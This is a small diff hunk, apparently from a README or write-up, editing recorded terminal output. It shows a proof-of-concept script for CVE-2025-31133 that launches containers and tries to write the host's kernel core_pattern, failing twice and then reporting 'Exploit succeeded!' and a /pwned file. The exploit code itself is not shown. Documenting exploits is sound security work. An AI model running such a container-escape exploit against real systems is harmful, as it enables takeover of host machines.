@@ -13,7 +13,9 @@ ubuntu@vm:~$ python3 /tmp/cve-2025-31133-poc.py
 Launched container: axXjevWaJ1deK3OuharhsOZrK0FsrEUh
 /bin/sh: can't create /proc/sys/kernel/core_pattern: Read-only file system
 Exploit did not succeed. Try again.
-ubuntu@vm:~$ python3 /cve-2025-31133-poc.py
+Launched container: PVlXAUsXqGN1qNWCd4sgAlVxFr1GvyT2
+/bin/sh: can't create /proc/sys/kernel/core_pattern: Read-only file system
+Exploit did not succeed. Try again.
 Launched container: J3vwzaXv5DOfCEciwQiAAUHMuAb8sZXe
 Exploit succeeded!
 ubuntu@vm:~$ ls -la /pwned
